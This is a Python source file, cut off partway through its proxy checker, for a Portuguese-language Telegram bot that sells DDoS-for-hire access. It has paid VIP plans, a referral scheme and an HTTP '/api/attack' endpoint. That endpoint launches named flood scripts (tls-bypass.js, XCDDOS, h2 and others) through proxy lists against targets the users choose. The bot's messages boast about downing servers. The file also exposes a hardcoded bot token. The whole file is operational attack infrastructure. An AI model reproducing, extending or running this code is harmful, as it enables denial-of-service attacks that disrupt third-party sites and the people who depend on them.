#!/usr/bin/env python3
# mdz.py - TW-MDZ OMNI-CORE (sem Redis, com /checkmulti)

import subprocess
import time
import sqlite3
import requests
import urllib3
import asyncio
import psutil
import html
import base64
import pytz
import random
import socket
import uuid
import aiohttp
from aiohttp import web
from urllib.parse import urlparse
from io import BytesIO
from datetime import datetime, timedelta
from telegram import Update, constants, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, ContextTypes, CallbackQueryHandler, MessageHandler, filters

# Suprime avisos HTTPS
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ==========================================
# ⚙️ CONFIGURAÇÕES
# ==========================================
OWNER_ID = 8523690887
BOT_TOKEN = "8832110028:AAHcCVOiH7qtspKps8fx8yqxbsqV7c-sAkI"
ID_DO_CANAL = -1003979405446
LINK_DO_CANAL = "https://t.me/mdzmoddrds"
ID_DO_CANAL_PROOF = -1003917649609
LINK_DO_CANAL_PROOF = "https://t.me/proofmd"  # Atualizado
SUPORTE_USER = "@gringomdz"
SP_TZ = pytz.timezone('America/Sao_Paulo')

API_PORT = 8080
INVITES_FOR_VIP = 3
VIP_REWARD_DAYS = 1

# URLs de pagamento
API_GERAR = "https://promstpagamentos.discloud.app/create_payment?user_id="
API_STATUS = "https://promstpagamentos.discloud.app/verify_payment?payment_id="

# ==========================================
# 💳 PLANOS
# ==========================================
PLANOS = {
    "trial": {"nome": "⏳ TESTE (3 DIAS)", "valor": 0.00, "dias": 3},
    "diario": {"nome": "⚡ ACESSO 24H", "valor": 15.00, "dias": 1},
    "semanal": {"nome": "🛰️ ACESSO SEMANAL", "valor": 35.00, "dias": 7},
    "mensal": {"nome": "💎 ACESSO MENSAL", "valor": 65.00, "dias": 30},
    "trimestral": {"nome": "🔥 ACESSO TRIMESTRAL", "valor": 115.00, "dias": 90},
    "vitalicio": {"nome": "👑 ACESSO VITALÍCIO", "valor": 340.00, "dias": 36500}
}

MAX_TIME_FREE = 120
MAX_TIME_VIP = 3600
DEFAULT_TIME = 120
DEFAULT_RATE = 30
DEFAULT_THREADS = 2
MAX_LIFETIME_THREADS = 10
COOLDOWN_FREE = 300

# ==========================================
# 📊 VARIÁVEIS DE ESTADO
# ==========================================
active_attacks = {}
last_attack_time = {}
bot_start_time = time.time()
banned_users = {}
captcha_passed = set()
bot_username_cache = ""

FRASES_QUEDA = [
    "O terror da web chegou.",
    "A segurança deles era apenas uma ilusão.",
    "Mais um alvo neutralizado com sucesso.",
    "Sem chance de defesa. Operação concluída.",
    "Os servidores choram perante o TW-MDZ.",
    "O abismo os aguarda. Target DOWN.",
    "Resistência fútil. Roteamento destruído."
]

# ==========================================
# 🗄️ SISTEMA DE BASE DE DADOS
# ==========================================
def init_db():
    conn = sqlite3.connect('nfu_master.db')
    cur = conn.cursor()
    cur.execute('CREATE TABLE IF NOT EXISTS vips (user_id INTEGER PRIMARY KEY, expiry TEXT, plan TEXT DEFAULT "diario")')
    cur.execute('CREATE TABLE IF NOT EXISTS users (user_id INTEGER PRIMARY KEY, username TEXT, full_name TEXT)')
    cur.execute('CREATE TABLE IF NOT EXISTS ataques (user_id INTEGER, username TEXT, target TEXT, timestamp INTEGER)')
    cur.execute('CREATE TABLE IF NOT EXISTS authorized (user_id INTEGER PRIMARY KEY)')
    cur.execute('CREATE TABLE IF NOT EXISTS blacklist (domain TEXT PRIMARY KEY)')
    cur.execute('CREATE TABLE IF NOT EXISTS blacklist_total (domain TEXT PRIMARY KEY)')
    cur.execute('CREATE TABLE IF NOT EXISTS pending_payments (trans_id TEXT PRIMARY KEY, user_id INTEGER, dias INTEGER)')
    cur.execute('CREATE TABLE IF NOT EXISTS groups_config (group_id INTEGER PRIMARY KEY, attack_limit INTEGER)')
    cur.execute('CREATE TABLE IF NOT EXISTS referrals (user_id INTEGER PRIMARY KEY, invites INTEGER DEFAULT 0, total_invites INTEGER DEFAULT 0)')
    cur.execute('CREATE TABLE IF NOT EXISTS api_keys (user_id INTEGER PRIMARY KEY, api_key TEXT, auth_ip TEXT)')
    cur.execute('CREATE TABLE IF NOT EXISTS gifts (code TEXT PRIMARY KEY, days INTEGER, plan TEXT)')
    cur.execute('CREATE TABLE IF NOT EXISTS system_config (key TEXT PRIMARY KEY, value TEXT)')
    cur.execute('INSERT OR IGNORE INTO system_config (key, value) VALUES ("free_plan", "on")')
    cur.execute('INSERT OR IGNORE INTO system_config (key, value) VALUES ("maintenance", "off")')
    cur.execute('INSERT OR IGNORE INTO system_config (key, value) VALUES ("menu_photo", "off")')
    cur.execute('INSERT OR IGNORE INTO system_config (key, value) VALUES ("pix_system", "on")')
    conn.commit()
    conn.close()

def carregar_blacklist():
    dominios = [
        "gov.br", "mil.br", "jus.br", "leg.br", "pf.gov.br", "stf.jus.br",
        "receita.fazenda.gov.br", "presidencia.gov.br", "fbi.gov", "cia.gov",
        "bb.com.br", "https://mdzplus.mdzapis.com/",  "itau.com.br", "bradesco.com.br", "caixa.gov.br", "nubank.com.br",
        "cloudflare.com", ".onion", "localhost", "127.0.0.1"
    ]
    conn = sqlite3.connect('nfu_master.db')
    cur = conn.cursor()
    for d in dominios: cur.execute("INSERT OR IGNORE INTO blacklist (domain) VALUES (?)", (d,))
    conn.commit(); conn.close()

def get_config(key):
    conn = sqlite3.connect('nfu_master.db'); cur = conn.cursor()
    cur.execute("SELECT value FROM system_config WHERE key = ?", (key,))
    res = cur.fetchone(); conn.close()
    return res[0] if res else "off"

def set_config(key, value):
    conn = sqlite3.connect('nfu_master.db'); cur = conn.cursor()
    cur.execute("INSERT OR REPLACE INTO system_config (key, value) VALUES (?, ?)", (key, value))
    conn.commit(); conn.close()

def get_user_status(uid):
    if uid == OWNER_ID: return True, "admin", "INFINITO"
    conn = sqlite3.connect('nfu_master.db'); cur = conn.cursor()
    cur.execute("SELECT expiry, plan FROM vips WHERE user_id = ?", (uid,))
    res = cur.fetchone(); conn.close()
    if not res: return False, "nenhum", None
    try:
        expiry_date = datetime.strptime(res[0], '%Y-%m-%d %H:%M:%S')
        expiry_date = SP_TZ.localize(expiry_date) if expiry_date.tzinfo is None else expiry_date
        now = datetime.now(SP_TZ)
        if expiry_date > now: return True, res[1], res[0]
    except: pass
    return False, "nenhum", None

def is_vip(uid):
    vip, _, _ = get_user_status(uid)
    return vip

def has_api_access(uid):
    _, plano, _ = get_user_status(uid)
    return plano in ['mensal', 'trimestral', 'vitalicio', 'admin']

def is_authorized(uid):
    if uid == OWNER_ID: return True
    conn = sqlite3.connect('nfu_master.db'); cur = conn.cursor()
    cur.execute("SELECT user_id FROM authorized WHERE user_id = ?", (uid,))
    res = cur.fetchone(); conn.close()
    return True if res else False

def get_group_limit(chat_id):
    conn = sqlite3.connect('nfu_master.db'); cur = conn.cursor()
    cur.execute("SELECT attack_limit FROM groups_config WHERE group_id = ?", (chat_id,))
    res = cur.fetchone(); conn.close()
    return res[0] if res else MAX_TIME_FREE

def is_blacklisted(url):
    domain = urlparse(url).netloc or urlparse(url).path
    domain = domain.split(":")[0]
    conn = sqlite3.connect('nfu_master.db'); cur = conn.cursor()
    cur.execute("SELECT domain FROM blacklist")
    blacklisted_domains = [row[0] for row in cur.fetchall()]
    conn.close()
    for bd in blacklisted_domains:
        if domain == bd or domain.endswith("." + bd): return True
    return False

def is_blacklisted_total(url):
    domain = urlparse(url).netloc or urlparse(url).path
    domain = domain.split(":")[0]
    conn = sqlite3.connect('nfu_master.db'); cur = conn.cursor()
    cur.execute("SELECT domain FROM blacklist_total")
    blacklisted_domains = [row[0] for row in cur.fetchall()]
    conn.close()
    for bd in blacklisted_domains:
        if domain == bd or domain.endswith("." + bd): return True
    return False

def add_vip_days(uid, days, plan_type='diario'):
    conn = sqlite3.connect('nfu_master.db'); cur = conn.cursor()
    cur.execute("SELECT expiry FROM vips WHERE user_id = ?", (uid,))
    res = cur.fetchone()
    now = datetime.now(SP_TZ)
    if res:
        try:
            current_expiry = SP_TZ.localize(datetime.strptime(res[0], '%Y-%m-%d %H:%M:%S'))
            if current_expiry > now: now = current_expiry
        except: pass
    new_expiry = (now + timedelta(days=days)).strftime('%Y-%m-%d %H:%M:%S')
    cur.execute("INSERT OR REPLACE INTO vips (user_id, expiry, plan) VALUES (?, ?, ?)", (uid, new_expiry, plan_type))
    conn.commit(); conn.close()

def process_referral(new_uid, referrer_id, context):
    if new_uid == referrer_id: return
    conn = sqlite3.connect('nfu_master.db'); cur = conn.cursor()
    cur.execute("SELECT invites, total_invites FROM referrals WHERE user_id = ?", (referrer_id,))
    res = cur.fetchone()
    invites = res[0] + 1 if res else 1
    total = res[1] + 1 if res else 1
    if invites >= INVITES_FOR_VIP:
        add_vip_days(referrer_id, VIP_REWARD_DAYS, 'diario')
        invites = 0
        asyncio.create_task(context.bot.send_message(
            chat_id=referrer_id,
            text=format_message("RECOMPENSA DE RECRUTAMENTO", [
                f"🎉 Você recrutou {INVITES_FOR_VIP} agentes válidos!",
                f"<b>+{VIP_REWARD_DAYS} DIA(S) DE VIP ADICIONADO(S)</b>"
            ])
        ))
    cur.execute("INSERT OR REPLACE INTO referrals (user_id, invites, total_invites) VALUES (?, ?, ?)", (referrer_id, invites, total))
    conn.commit(); conn.close()

def generate_captcha_data():
    codigo = str(random.randint(1000, 9999))
    opcoes = [codigo]; falso = ""
    while len(opcoes) < 4:
        falso = str(random.randint(1000, 9999))
        if falso not in opcoes: opcoes.append(falso)
    random.shuffle(opcoes)
    kb = [
        [InlineKeyboardButton(opcoes[0], callback_data=f"cap_{opcoes[0]}_{codigo}"), InlineKeyboardButton(opcoes[1], callback_data=f"cap_{opcoes[1]}_{codigo}")],
        [InlineKeyboardButton(opcoes[2], callback_data=f"cap_{opcoes[2]}_{codigo}"), InlineKeyboardButton(opcoes[3], callback_data=f"cap_{opcoes[3]}_{codigo}")]
    ]
    url_img = f"https://dummyimage.com/400x150/0a0a0a/00ffcc.png&text=SEC-ID:+{codigo}"
    return url_img, InlineKeyboardMarkup(kb)

# ==========================================
# 🎨 SISTEMA DE FORMATAÇÃO PADRÃO
# ==========================================
def format_message(title, body_lines, footer=None, sep="━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"):
    """
    Retorna uma mensagem formatada com separadores e título.
    Exemplo:
    ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
    🔰 TÍTULO
    ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
    │ linha 1
    │ linha 2
    ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
    """
    lines = [f"{sep}", f"🔰 <b>{title}</b>", f"{sep}"]
    for line in body_lines:
        lines.append(f"│ {line}")
    if footer:
        lines.append(f"{sep}")
        lines.append(f"│ {footer}")
    lines.append(f"{sep}")
    return "\n".join(lines)

# ==========================================
# 📝 SISTEMA DE LOGS
# ==========================================
async def send_log(context: ContextTypes.DEFAULT_TYPE, log_type: str, uid: int, details: str):
    icon = {"NEW_USER": "👤", "PAY_GEN": "🧾", "PAY_DONE": "✅", "SPAM": "⚠️", "ATK": "🚀", "BLACKLIST": "🛡️", "BYPASS_ATTEMPT": "🚨", "BAN": "⛔", "GIFT": "🎁", "API_USE": "🔌"}.get(log_type, "📝")
    
    conn = sqlite3.connect('nfu_master.db'); cur = conn.cursor()
    cur.execute("SELECT username, full_name FROM users WHERE user_id = ?", (uid,))
    res = cur.fetchone(); conn.close()
    
    if res:
        username = f"@{res[0]}" if res[0] else "Sem Username"
        full_name = html.escape(res[1]) if res[1] else "Agente"
    else:
        username = "Sem Username"
        full_name = "Agente"

    txt = format_message("LOG DO SISTEMA TW-MDZ", [
        f"{icon} <b>Usuário:</b> {full_name}",
        f"🔗 <b>Username:</b> {username}",
        f"🆔 <b>ID:</b> <code>{uid}</code>",
        f"⚙️ <b>Ação:</b> <code>{log_type}</code>",
        "📝 <b>Detalhes:</b>",
        f"<code>{details}</code>"
    ])
    try: await context.bot.send_message(chat_id=OWNER_ID, text=txt, parse_mode=constants.ParseMode.HTML)
    except: pass

async def check_access(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user; uid = user.id
    msg_target = update.message if update.message else update.callback_query.message
    if uid == OWNER_ID: return True

    if get_config("maintenance") == "on":
        txt = format_message("SISTEMA EM MANUTENÇÃO", [
            "🛠️ O núcleo do botnet está passando por",
            "atualizações e melhorias no momento.",
            "Por favor, retorne mais tarde."
        ])
        if update.callback_query: await update.callback_query.edit_message_text(txt, parse_mode=constants.ParseMode.HTML)
        elif update.message: await update.message.reply_text(txt, parse_mode=constants.ParseMode.HTML, reply_to_message_id=msg_target.message_id)
        return False

    if uid in banned_users:
        data = banned_users[uid]
        if time.time() < data["expires"]:
            rem = int(data["expires"] - time.time())
            txt = format_message("ACESSO BLOQUEADO", [
                f"⛔ <b>Seu ID está exilado do núcleo.</b>",
                f"📝 <b>Motivo:</b> <code>{data['reason']}</code>",
                f"⏳ <b>Restam:</b> <code>{rem}s</code>"
            ])
            kb = [[InlineKeyboardButton("📩 Solicitar Revisão ao Supremo", callback_data=f"appeal_{uid}")]]
            if update.callback_query: await update.callback_query.edit_message_text(txt, reply_markup=InlineKeyboardMarkup(kb), parse_mode=constants.ParseMode.HTML)
            elif update.message: await update.message.reply_text(txt, reply_markup=InlineKeyboardMarkup(kb), parse_mode=constants.ParseMode.HTML, reply_to_message_id=msg_target.message_id)
            return False
        else: del banned_users[uid]

    if is_authorized(uid): return True

    try:
        m1 = await context.bot.get_chat_member(chat_id=ID_DO_CANAL, user_id=uid)
        m2 = await context.bot.get_chat_member(chat_id=ID_DO_CANAL_PROOF, user_id=uid)
        status_ok = [constants.ChatMemberStatus.MEMBER, constants.ChatMemberStatus.ADMINISTRATOR, constants.ChatMemberStatus.OWNER]
        if m1.status in status_ok and m2.status in status_ok:
            return True
    except: pass
    
    kb = [
        [InlineKeyboardButton("🔗 CANAL PRINCIPAL", url=LINK_DO_CANAL)],
        [InlineKeyboardButton("🔗 CANAL DE PROVAS (PROOF)", url=LINK_DO_CANAL_PROOF)]
    ]
    txt = format_message("ACESSO RESTRITO", [
        "🚫 Para comandar a botnet e lançar",
        "ataques, é obrigatório ser membro de",
        "<b>AMBOS</b> os nossos esquadrões."
    ])
    if update.callback_query: await update.callback_query.edit_message_text(txt, reply_markup=InlineKeyboardMarkup(kb), parse_mode=constants.ParseMode.HTML)
    elif update.message: await update.message.reply_text(txt, reply_markup=InlineKeyboardMarkup(kb), parse_mode=constants.ParseMode.HTML, reply_to_message_id=msg_target.message_id)
    return False

async def check_site_status(url):
    if not url.startswith("http"): url = "http://" + url
    try:
        r = requests.get(url, timeout=3, verify=False, headers={'User-Agent': 'Mozilla/5.0'})
        if r.status_code >= 500: return f"🔴 DOWN ({r.status_code})"
        elif r.status_code >= 400: return f"🟡 WAF ({r.status_code})"
        else: return "🟢 ONLINE"
    except: return "🔴 DEAD"

# ==========================================
# 🌐 API ENDPOINT
# ==========================================
async def handle_api_attack(request):
    key = request.query.get('key')
    target = request.query.get('target')
    time_req = request.query.get('time', str(DEFAULT_TIME))
    method = request.query.get('method', 'mdzar')
    threads_req = request.query.get('threads', str(DEFAULT_THREADS))
    client_ip = request.headers.get('X-Forwarded-For', request.remote).split(',')[0].strip()

    if not key or not target:
        return web.json_response({"error": "Parâmetros 'key' e 'target' são obrigatórios.", "feedback": "Requisição malformada."}, status=400)

    conn = sqlite3.connect('nfu_master.db'); cur = conn.cursor()
    cur.execute('''
        SELECT k.user_id, k.auth_ip, u.username
        FROM api_keys k
        LEFT JOIN users u ON k.user_id = u.user_id
        WHERE k.api_key = ?
    ''', (key,))
    user_data = cur.fetchone(); conn.close()

    if not user_data:
        return web.json_response({"error": "API Key inválida ou inexistente.", "feedback": "Chave não autenticada no servidor C2."}, status=401)

    uid, auth_ip, username = user_data[0], user_data[1], user_data[2]
    tag_usuario = f"@{username}" if username else "Sem Username"

    if auth_ip != client_ip:
        return web.json_response({"error": f"IP não autorizado. Seu IP: {client_ip}. IP atrelado: {auth_ip}", "feedback": "Firewall de Whitelist IP acionado."}, status=403)
    if not has_api_access(uid):
        return web.json_response({"error": "Acesso negado. A API externa requer Assinatura Mensal, Trimestral ou Vitalícia.", "feedback": "Privilégios insuficientes."}, status=403)

    if not target.startswith("http"): target = "http://" + target

    if uid != OWNER_ID and is_blacklisted_total(target):
        return web.json_response({"error": "Alvo protegido por Blacklist Total do Supremo.", "feedback": "Firewall Militar Ativo."}, status=403)

    try: atk_time = min(int(time_req), MAX_TIME_VIP)
    except: atk_time = DEFAULT_TIME

    vip, plano, _ = get_user_status(uid)
    if plano == 'vitalicio' or uid == OWNER_ID:
        try: atk_threads = min(int(threads_req), MAX_LIFETIME_THREADS)
        except: atk_threads = DEFAULT_THREADS
    else:
        atk_threads = DEFAULT_THREADS

    cmd = []
    if method == "mdzar": cmd = ["node", "ar.js", target, str(atk_time), str(DEFAULT_RATE), str(atk_threads), "proxy.txt"]
    elif method == "mdz-by": cmd = ["node", "bs", target, str(atk_time), str(DEFAULT_RATE), str(atk_threads), "proxy.txt"]
    elif method == "tls": cmd = ["node", "tls-bypass.js", target, str(atk_time), str(DEFAULT_RATE), str(atk_threads)]
    elif method == "tun": cmd = ["node", "tun.js", target, str(atk_time), str(DEFAULT_RATE), str(atk_threads), "proxy.txt"]
    elif method == "rapid": cmd = ["node", "rapidv2", "bypass", str(atk_time), str(atk_threads), "proxy.txt", str(DEFAULT_RATE), target]
    elif method == "lez": cmd = ["node", "lezkill.js", target, str(atk_time), str(DEFAULT_RATE), str(atk_threads), "proxy.txt"]
    elif method == "tw-mdz": cmd = ["node", "tw.js", target, str(atk_time), str(DEFAULT_RATE), str(atk_threads), "proxy.txt"]
    elif method == "mdzdd": cmd = ["./XCDDOS", target, str(atk_time), str(DEFAULT_RATE), str(atk_threads)]
    elif method == "h2": cmd = ["node", "h2", "GET", target, str(atk_time), str(atk_threads), "proxy.txt"]
    elif method == "hby": cmd = ["node", "hby", target, str(atk_time), str(DEFAULT_RATE), str(atk_threads), "proxy.txt", "--all"]
    elif method == "fury": cmd = ["node", "fu.js", "GET", target, str(atk_time), str(atk_threads), str(DEFAULT_RATE), "proxy.txt", "--full"]
    elif method == "httpkill": cmd = ["node", "httpk.js", target, str(atk_time), str(atk_threads), str(DEFAULT_RATE), "proxy.txt"]
    elif method == "mdzdestroy": cmd = ["node", "mdz-destroy", target, str(atk_time), str(DEFAULT_RATE), str(atk_threads), "proxy.txt"]
    elif method == "mdzfuck": cmd = ["node", "mdz-fuck", target, str(atk_time), str(DEFAULT_RATE), str(atk_threads), "proxy.txt"]
    else: return web.json_response({"error": "Método de ataque inválido", "feedback": "Métodos aceitos: mdzdd, tw-mdz, lez, rapid, tun, tls, mdzar, mdz-by, h2, hby, fury, httpkill, mdzdestroy, mdzfuck"}, status=400)

    try:
        proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        conn = sqlite3.connect('nfu_master.db'); cur = conn.cursor()
        cur.execute("INSERT INTO ataques VALUES (?, ?, ?, ?)", (uid, "API_EXEC", target, int(time.time())))
        conn.commit(); conn.close()

        log_api_dono = format_message("LOG DE DISPARO C2 (API)", [
            f"🎯 <b>Site Alvo:</b> <code>{target}</code>",
            f"⏱️ <b>Tempo:</b> <code>{atk_time}s</code>",
            f"🧵 <b>Threads Alocadas:</b> <code>{atk_threads}</code>",
            f"⚙️ <b>Método:</b> <code>{method.upper()}</code>",
            f"🔑 <b>Key Usada:</b> <code>{key}</code>",
            f"👤 <b>Registrante da Key:</b> {tag_usuario} (ID: <code>{uid}</code>)"
        ])
        try:
            bot_instance = request.app.get('bot')
            if bot_instance:
                asyncio.create_task(bot_instance.send_message(chat_id=OWNER_ID, text=log_api_dono, parse_mode=constants.ParseMode.HTML))
        except: pass

        feedback_unico = {
            "status": "success",
            "feedback": {
                "message": "Ogiva injetada com sucesso pela arquitetura C2.",
                "target_confirmed": target,
                "duration_seconds": atk_time,
                "concurrencies_applied": atk_threads,
                "method_executed": method.upper(),
                "node_status": "ARMED"
            }
        }
        return web.json_response(feedback_unico)
    except Exception as e: return web.json_response({"error": "Falha na submissão ao núcleo.", "feedback": str(e)}, status=500)

# ==========================================
# 🔄 DAEMONS
# ==========================================
async def vip_expiration_checker(app: Application):
    while True:
        try:
            conn = sqlite3.connect('nfu_master.db')
            cur = conn.cursor()
            now = datetime.now(SP_TZ).strftime('%Y-%m-%d %H:%M:%S')

            cur.execute("SELECT v.user_id, v.plan, u.username, u.full_name FROM vips v LEFT JOIN users u ON v.user_id = u.user_id WHERE v.expiry <= ?", (now,))
            expired_vips = cur.fetchall()

            for row in expired_vips:
                uid, plan, username, full_name = row
                cur.execute("DELETE FROM vips WHERE user_id = ?", (uid,))
                conn.commit()
                user_tag = f"@{username}" if username else html.escape(full_name) if full_name else "Agente"

                txt_dono = format_message("ALERTA DE EXPIRAÇÃO VIP", [
                    f"👤 <b>Usuário:</b> {user_tag}",
                    f"🆔 <b>ID:</b> <code>{uid}</code>",
                    f"📦 <b>Plano Finalizado:</b> <code>{plan.upper()}</code>"
                ])
                try: await app.bot.send_message(chat_id=OWNER_ID, text=txt_dono, parse_mode=constants.ParseMode.HTML)
                except: pass

                txt_user = "⚠️ <b>Seu acesso VIP expirou!</b>\nO núcleo desativou seus privilégios de ataque sem limites. Renove seu arsenal usando o comando /comprar."
                try: await app.bot.send_message(chat_id=uid, text=txt_user, parse_mode=constants.ParseMode.HTML)
                except: pass

            conn.close()
        except Exception: pass
        await asyncio.sleep(60)

async def backup_daemon(app: Application):
    while True:
        await asyncio.sleep(7200)
        try:
            conn = sqlite3.connect('nfu_master.db')
            cur = conn.cursor()
            total_vips = cur.execute("SELECT COUNT(*) FROM vips").fetchone()[0]
            total_users = cur.execute("SELECT COUNT(*) FROM users").fetchone()[0]
            total_ataques = cur.execute("SELECT COUNT(*) FROM ataques").fetchone()[0]
            bl_comum = cur.execute("SELECT COUNT(*) FROM blacklist").fetchone()[0]
            bl_total = cur.execute("SELECT COUNT(*) FROM blacklist_total").fetchone()[0]
            total_bl = bl_comum + bl_total
            conn.close()

            txt_backup = format_message("SISTEMA DE BACKUP AUTOMÁTICO", [
                f"📦 <b>Arquivo Encriptado:</b> <code>nfu_master.db</code>",
                "┠ ── ✦ ── <b>ESTATÍSTICAS DO NÚCLEO</b> ── ✦ ──",
                f"⚡ <b>VIPs Ativos Cadastrados:</b> <code>{total_vips}</code>",
                f"🧟‍♂️ <b>Usuários Totais (Nodos):</b> <code>{total_users}</code>",
                f"💥 <b>Ataques Lançados:</b> <code>{total_ataques}</code>",
                f"🛡️ <b>Domínios na Blacklist:</b> <code>{total_bl}</code>"
            ])

            with open('nfu_master.db', 'rb') as db_file:
                await app.bot.send_document(
                    chat_id=OWNER_ID,
                    document=db_file,
                    caption=txt_backup,
                    parse_mode=constants.ParseMode.HTML
                )
        except Exception: pass

async def on_startup(app: Application):
    webapp = web.Application()
    webapp['bot'] = app.bot
    webapp.router.add_get('/api/attack', handle_api_attack)
    runner = web.AppRunner(webapp)
    await runner.setup()
    site = web.TCPSite(runner, '0.0.0.0', API_PORT)
    await site.start()
    print(f"========================================")
    print(f"🌐 API SERVER ONLINE NA PORTA {API_PORT}")
    print(f"========================================")

    asyncio.create_task(vip_expiration_checker(app))
    asyncio.create_task(backup_daemon(app))

# ==========================================
# 🎮 COMANDOS DE INTERFACE
# ==========================================
async def main_menu(update: Update, context: ContextTypes.DEFAULT_TYPE, force_text=False):
    """Exibe o menu principal com botões interativos."""
    user = update.effective_user
    uid = user.id
    name = html.escape(user.first_name)
    _, plano_atual, _ = get_user_status(uid)
    status_label = "👑 SUPREMO" if uid == OWNER_ID else (f"💎 ELITE ({plano_atual.upper()})" if has_api_access(uid) else (f"⚡ VIP ({plano_atual.upper()})" if is_vip(uid) else "🆓 RECRUTA"))
    alerta_free = "\n│ ⚠️ <b>STATUS:</b> PLANO GRATUITO OFF. COMPRE VIP." if get_config("free_plan") == "off" and not is_vip(uid) and uid != OWNER_ID else ""

    conn = sqlite3.connect('nfu_master.db')
    u_c = conn.cursor().execute("SELECT COUNT(*) FROM users").fetchone()[0]
    a_c = conn.cursor().execute("SELECT COUNT(*) FROM ataques").fetchone()[0]
    conn.close()

    txt = format_message("TW-MDZ OMNI-CORE V96.4", [
        f"👤 <b>Operador:</b> <code>{name}</code>",
        f"💠 <b>Patente:</b> <b>{status_label}</b>",
        f"🆔 <b>ID de Acesso:</b> <code>{uid}</code>{alerta_free}",
        "┠ ── ✦ ── <b>DADOS DA BOTNET GLOBAL</b> ── ✦ ──",
        f"🟢 <b>Status:</b> <code>ONLINE & ARMADO</code>",
        f"🧟‍♂️ <b>Nodes Ativos:</b> <code>{u_c}</code>",
        f"💥 <b>Quedas:</b> <code>{a_c} EXECUTADAS</code>"
    ])

    kb = [
        [InlineKeyboardButton("⚔️ ATACAR", callback_data="menu_attack")],
        [InlineKeyboardButton("💳 COMPRAR VIP", callback_data="menu_comprar")],
        [InlineKeyboardButton("🔑 API KEY", callback_data="menu_api")],
        [InlineKeyboardButton("📊 STATUS / RANK", callback_data="menu_status")],
        [InlineKeyboardButton("🎁 RESGATAR GIFT", callback_data="menu_gift")],
        [InlineKeyboardButton("📢 FEEDBACK", callback_data="menu_feed")]
    ]
    markup = InlineKeyboardMarkup(kb)

    if force_text or get_config("menu_photo") == "off":
        await update.message.reply_text(txt, reply_markup=markup, parse_mode=constants.ParseMode.HTML, disable_web_page_preview=True)
    else:
        foto_id = get_config("menu_photo")
        try:
            await update.message.reply_photo(photo=foto_id, caption=txt, reply_markup=markup, parse_mode=constants.ParseMode.HTML)
        except Exception:
            await update.message.reply_text(txt, reply_markup=markup, parse_mode=constants.ParseMode.HTML, disable_web_page_preview=True)

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not update.message: return
    user = update.effective_user
    uid = user.id

    global bot_username_cache
    if not bot_username_cache: bot_username_cache = context.bot.username

    if context.args and context.args[0].startswith("gift_"):
        context.args = [context.args[0].replace("gift_", "")]
        return await resgatar_gift(update, context)

    if uid != OWNER_ID and get_config("maintenance") == "on":
        return await check_access(update, context)

    if uid != OWNER_ID and uid not in captcha_passed:
        img_url, markup = generate_captcha_data()
        try: img_bytes = requests.get(img_url, timeout=5).content
        except: img_bytes = img_url

        txt_cap = format_message("SISTEMA DE SEGURANÇA NFU", [
            "🔐 Selecione o código correspondente à",
            "imagem para validar sua identidade",
            "e acessar o mainframe."
        ])
        return await update.message.reply_photo(photo=img_bytes, caption=txt_cap, reply_markup=markup, parse_mode=constants.ParseMode.HTML, reply_to_message_id=update.message.message_id)

    if not await check_access(update, context): return

    conn = sqlite3.connect('nfu_master.db'); cur = conn.cursor()
    cur.execute("SELECT user_id FROM users WHERE user_id = ?", (uid,))
    is_new = not cur.fetchone()

    if is_new:
        full_name_db = user.full_name if hasattr(user, 'full_name') and user.full_name else user.first_name
        cur.execute("INSERT INTO users (user_id, username, full_name) VALUES (?, ?, ?)", (uid, user.username, full_name_db))
        conn.commit()
        await send_log(context, "NEW_USER", uid, "Agente inserido no mainframe.")
        if context.args:
            try:
                referrer = int(context.args[0])
                process_referral(uid, referrer, context)
            except: pass
    conn.close()

    await main_menu(update, context)

async def feed_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not update.message: return
    if not await check_access(update, context): return

    if not context.args:
        return await update.message.reply_text("💡 <b>Uso:</b> <code>/feed [sua mensagem de feedback]</code>\n<i>Ex: /feed O novo método MDZ-BY está incrível!</i>", parse_mode=constants.ParseMode.HTML)

    feedback_text = " ".join(context.args)
    user = update.effective_user
    uid = user.id
    username = f"@{user.username}" if user.username else "Sem Username"
    name = html.escape(user.first_name)

    txt_feed = format_message("NOVO FEEDBACK DE AGENTE", [
        f"👤 <b>Nome:</b> {name}",
        f"🔗 <b>Username:</b> {username}",
        f"🆔 <b>ID:</b> <code>{uid}</code>",
        "💬 <b>Mensagem:</b>",
        f"<i>{feedback_text}</i>"
    ])

    try:
        await context.bot.send_message(chat_id=ID_DO_CANAL, text=txt_feed, parse_mode=constants.ParseMode.HTML)
        if uid != OWNER_ID:
            await context.bot.send_message(chat_id=OWNER_ID, text=txt_feed, parse_mode=constants.ParseMode.HTML)
        await update.message.reply_text("✅ <b>Feedback enviado com sucesso ao Supremo e ao Canal Oficial!</b>", parse_mode=constants.ParseMode.HTML)
    except Exception as e:
        await update.message.reply_text(f"❌ <b>Falha ao enviar feedback:</b> <code>{e}</code>", parse_mode=constants.ParseMode.HTML)

# ================= PROXY CHECKER (unificado) =================
last_check_result = {}  # chat_id -> list of alive proxies

async def process_proxy_file(update: Update, context: ContextTypes.DEFAULT_TYPE, document=None, is_check2=False):
    """Processa um único arquivo de proxies e retorna ativos."""
    if document:
        if not document.file_name.endswith('.txt'): return None
        file = await context.bot.get_file(document.file_id)
        content = await file.download_as_bytearray()
        proxies = [line.decode('utf-8').strip() for line in content.splitlines() if line.strip()]
        use_server_file = False
    else:
        try:
            with open("proxy.txt", "r") as f:
                proxies = [line.strip() for line in f if line.strip()]
            use_server_file = True
        except FileNotFoundError:
            await update.message.reply_text("❌ <b>Arquivo proxy.txt não encontrado no servidor.</b>", parse_mode=constants.ParseMode.HTML)
            return None

    if not proxies:
        await update.message.reply_text("❌ <b>Nenhuma proxy encontrada.</b>", parse_mode=constants.ParseMode.HTML)
        return None

    # Função interna que verifica e retorna resultados
    return await _check_proxies(proxies, use_server_file, update, context, is_check2)

async def _check_proxies(proxies, use_server_file, update, context, is_check2=False):
    """Verifica uma lista de proxies e retorna os vivos e estatísticas com contagens."""
    total = len(proxies)
